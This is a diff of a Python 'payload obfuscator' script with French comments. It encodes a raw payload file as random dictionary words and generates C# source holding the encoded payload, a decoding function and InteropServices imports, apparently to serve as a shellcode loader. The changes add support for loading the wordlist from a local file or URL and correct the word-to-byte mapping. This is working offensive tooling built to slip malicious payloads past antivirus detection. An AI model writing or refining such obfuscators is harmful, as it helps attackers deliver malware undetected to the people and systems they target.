@@ -3,10 +3,21 @@
 import sys
 import requests
 import random
-import json
+import os
 
+def get_wordlist(wordlist_source):
+    # Si c'est une URL, on télécharge
+    if wordlist_source.startswith("http://") or wordlist_source.startswith("https://"):
+        response = requests.get(wordlist_source)
+        words = response.content.splitlines()
+        words = [word.decode('utf-8') for word in words]
+    # Sinon, on lit le fichier local
+    else:
+        with open(wordlist_source, 'r') as f:
+            words = [line.strip() for line in f if line.strip()]
+    return words
 
-def main(input_file):
+def main(input_file, wordlist_source):
     # headers
     csharp_headers = '''using System;
 using System.Collections.Generic;
@@ -18,16 +29,12 @@ using System.Reflection;
 using System.Runtime.InteropServices;
     '''
 
-
-    # Creation du dictionnaire de correspondance
-    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
-    response = requests.get(word_site)
-    words = response.content.splitlines()
-    words = [word.decode('utf-8') for word in words]
+    # Création du dictionnaire de correspondance
+    words = get_wordlist(wordlist_source)
     random.shuffle(words)
     hex_values = [f'0x{i:02x}' for i in range(256)]
     word_dict = dict(zip(hex_values, words[:256]))
-    dict_items = [f'{{ "{hex_val}", {word}}}' for word, hex_val in word_dict.items()]
+    dict_items = [f'{{ "{word}", {hex_val} }}' for hex_val, word in word_dict.items()]
     csharp_dict = "var wordDict = new Dictionary<string, byte>\n{\n    " + ",\n    ".join(dict_items) + "\n};"
 
     # Encodage du payload
@@ -41,8 +48,7 @@ using System.Runtime.InteropServices;
             byte = f_in.read(1)
     encoded_string = encoded_string.rstrip() + "\";"
 
-
-    # Affichage de la fonction de decodage
+    # Affichage de la fonction de décodage
     csharp_decoding_function = """
     static byte[] DecodeWordsToBytes(string data, Dictionary<string, byte> wordDict){
         var words = data.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
@@ -70,8 +76,6 @@ using System.Runtime.InteropServices;
         return;
     }
     '''
-
-
 
     csharp_class_1 = '''
 public class Program
@@ -114,16 +118,14 @@ public class Program
         f.write(cs_code)
     print("Code C# généré avec succès dans 'generated_code.cs'")
 
-    
-
-
 if __name__ == "__main__":
     print("##########################################")
     print("########### PAYLOAD OBFUSCATOR ###########")
     print("##########################################\n")
-    if len(sys.argv) != 2:
-        print("Usage: python encode_cs.py <path_to_raw_payload_file>\n")
+    if len(sys.argv) < 2:
+        print("Usage: python encode_cs.py <path_to_raw_payload_file> [<path_or_url_to_wordlist>]\n")
         sys.exit(1)
-    
+
     file_path = sys.argv[1]
-    main(file_path)
+    wordlist_source = sys.argv[2] if len(sys.argv) > 2 else "https://www.mit.edu/~ecprice/wordlist.10000"
+    main(file_path, wordlist_source)
